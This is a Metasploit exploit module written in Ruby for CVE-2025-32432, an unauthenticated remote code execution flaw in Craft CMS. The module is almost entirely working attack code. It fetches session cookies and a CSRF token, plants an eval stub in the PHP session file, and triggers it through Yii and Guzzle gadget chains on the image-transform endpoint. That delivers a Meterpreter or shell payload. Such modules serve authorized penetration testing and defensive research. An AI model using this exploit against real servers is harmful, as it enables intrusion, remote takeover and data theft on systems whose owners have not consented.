##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Payload::Php
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Craft CMS Image Transform Preauth RCE (CVE-2025-32432)',
        'Description' => %q{
          This module exploits an unauthenticated remote code execution vulnerability
          in Craft CMS versions 3.x, 4.x, and 5.x < 5.6.17 via the image transform endpoint.
          It injects a PHP Meterpreter payload into the Craft session, then triggers its execution
          by abusing the Yii behavior gadget chain (PhpManager) on the generate-transform endpoint.

          Discovered in the wild by Orange Cyberdefense CSIRT and assigned CVE-2025-32432.
        },
        'Author' => [
          'Nicolas Bourras (Orange Cyberdefense)', # Research + PoC
          'Valentin Lobstein'                      # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2025-32432' ],
          [ 'URL', 'https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/' ],
          [ 'URL', 'https://blog.onyphe.io/en/cve-2025-32432-0day-craft-cms-discovered-by-orange-cyberdefense/' ]
        ],
        'Platform' => %w[php unix linux],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [
          [
            'PHP In-Memory',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
            }
          ],
          [
            'Unix/Linux Command Shell',
            {
              'Platform' => %(unix linux),
              'Arch' => ARCH_CMD
            }
          ],
        ],
        'Privileged' => false,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2025-04-14',
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Base path', '/' ]),
        OptInt.new('ASSET_ID', [true, 'Existing asset ID', Rex::Text.rand_text_numeric(2..3)])
      ]
    )
  end

  def check
    csrf_token = fetch_cookies_and_csrf
    return CheckCode::Unknown('Could not retrieve cookies & CSRF') if csrf_token.nil?

    vprint_status "Using CSRF token: #{csrf_token}"

    response = send_transform(csrf_token, datastore['ASSET_ID'], 'phpinfo')
    return CheckCode::Unknown('No response from generate-transform') if response.nil?

    if response.body.include?('If you did not receive a copy of the PHP license')
      CheckCode::Vulnerable('License text detected')
    else
      CheckCode::Safe('License text not detected')
    end
  end

  def php_exec_cmd(encoded_payload)
    generator = Rex::RandomIdentifier::Generator.new
    disabled_var = "$#{generator[:dis]}"
    payload_b64 = Rex::Text.encode_base64(encoded_payload)

    <<~PHP
      #{php_preamble(disabled_varname: disabled_var)}
      $c=base64_decode("#{payload_b64}");
      #{php_system_block(cmd_varname: '$c', disabled_varname: disabled_var)}
    PHP
  end

  def exploit
    payload_code = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
    encoded_payload = framework.encoders
                               .create('php/base64')
                               .encode(payload_code)

    random_param = Rex::Text.rand_text_alphanumeric(5..12)
    initial_payload = "<?=eval($_GET['#{random_param}']);die()?>"

    print_status 'Making initial request to push payload and get a CSRF token'
    session_id, csrf_token = fetch_cookies_and_csrf(initial_payload)
    unless csrf_token
      fail_with(Failure::Unknown, 'Could not retrieve session ID and CSRF token')
    end

    vprint_status "Session ID: #{session_id}"
    vprint_status "CSRF token: #{csrf_token}"

    print_status 'Triggering code via assets/generate-transform'
    request_payload = {
      assetId: datastore['ASSET_ID'],
      handle: {
        width: Rex::Text.rand_text_numeric(1..5),
        height: Rex::Text.rand_text_numeric(1..5),
        'as hack' => {
          class: 'craft\\behaviors\\FieldLayoutBehavior',
          __class: 'yii\\rbac\\PhpManager',
          '__construct()' => [
            { itemFile: "/var/lib/php/sessions/sess_#{session_id}" }
          ]
        }
      }
    }.to_json

    send_request_cgi!(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => { 'p' => 'actions/assets/generate-transform', random_param => encoded_payload },
      'headers' => { 'X-CSRF-Token' => csrf_token },
      'ctype' => 'application/json',
      'data' => request_payload,
      'keep_cookies' => true
    )
  end

  def extract_csrf_token(res)
    get_token = lambda do |r|
      next unless r&.code == 200

      r.get_html_document.at("//input[@name='CRAFT_CSRF_TOKEN']/@value")&.text
    end

    token = get_token.call(res)

    if token.nil? || token.empty?
      vprint_status 'CSRF not found, falling back to root'
      fb_res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'keep_cookies' => true
      )
      token = get_token.call(fb_res)
    end

    token unless token.nil? || token.empty?
  end

  def fetch_cookies_and_csrf(payload_param = nil)
    rand_param = Rex::Text.rand_text_alphanumeric(5..12)
    params = { 'p' => 'admin/dashboard', rand_param => payload_param }.compact

    cookie_jar.clear
    res = send_request_cgi(
      'method' => 'GET',
      'uri_encode_mode' => 'none',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => params
    )
    return nil unless res

    raw_cookies = res.get_cookies.to_s
    session_id = raw_cookies.scan(/CraftSessionId=([^;]+)/).flatten.first
    return nil if session_id.nil? || session_id.empty?

    if res.code == 302 && res.headers['Location']
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => res.headers['Location'],
        'keep_cookies' => true
      )
    end

    token = extract_csrf_token(res)
    return nil unless token

    payload_param ? [session_id, token] : token
  end

  def send_transform(csrf, asset_id, php_string)
    json_data = {
      'assetId' => asset_id,
      'handle' => {
        'width' => Rex::Text.rand_text_numeric(1..5),
        'height' => Rex::Text.rand_text_numeric(1..5),
        'as session' => {
          'class' => 'craft\\behaviors\\FieldLayoutBehavior',
          '__class' => 'GuzzleHttp\\Psr7\\FnStream',
          '__construct()' => [
            []
          ],
          '_fn_close' => php_string
        }
      }
    }.to_json

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => { 'p' => 'admin/actions/assets/generate-transform' },
      'ctype' => 'application/json',
      'headers' => { 'X-CSRF-Token' => csrf },
      'data' => json_data
    )
  end
end
